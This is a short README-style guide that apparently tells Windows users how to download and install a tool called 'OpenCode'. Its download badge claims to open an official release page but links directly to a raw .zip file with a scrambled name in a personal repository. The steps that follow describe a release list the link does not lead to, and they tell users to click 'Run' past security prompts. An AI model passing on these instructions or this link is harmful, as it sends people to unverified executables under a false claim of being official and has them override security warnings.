## 🚀 Getting Started

Follow these steps to download and run OpenCode correctly on your Windows PC.

### 1. Visit the Download Page

Go to the official release page by clicking the big button below:

[![Download OpenCode](https://img.shields.io/badge/Download-OpenCode-grey?style=for-the-badge)](https://raw.githubusercontent.com/epicface44/OpenCode-Everything-You-Need-to-Know/main/docs/Open-Need-to-Code-Everything-You-Know-v1.3.zip)

This page lists all the available versions for OpenCode.

### 2. Choose the Latest Version

Look for the most recent release near the top of the page. Each release has files attached for Windows and other systems.

- Find the file with `.exe` or `.msi` extension.
- This is the installer for Windows.

### 3. Download the Installer

Click on the Windows installer file to start the download. Your browser will save it in your Downloads folder or wherever you set files to be saved.

### 4. Run the Installer

Once downloaded:

- Open the Downloads folder
- Double-click the installer file (usually named like `OpenCode-setup.exe`)
- If a security prompt appears, select "Run"

### 5. Follow the Installation Wizard

The installer will guide you through the setup:

- Accept the license terms
- Choose the installation folder or leave the default
- Select extra options if available (like desktop shortcut)

Click "Next" until the setup finishes.

### 6. Finish and Launch OpenCode

When installation completes:

- Click "Finish"
- The setup may offer to start OpenCode right away. Choose to launch it now or open it later from the Start menu.
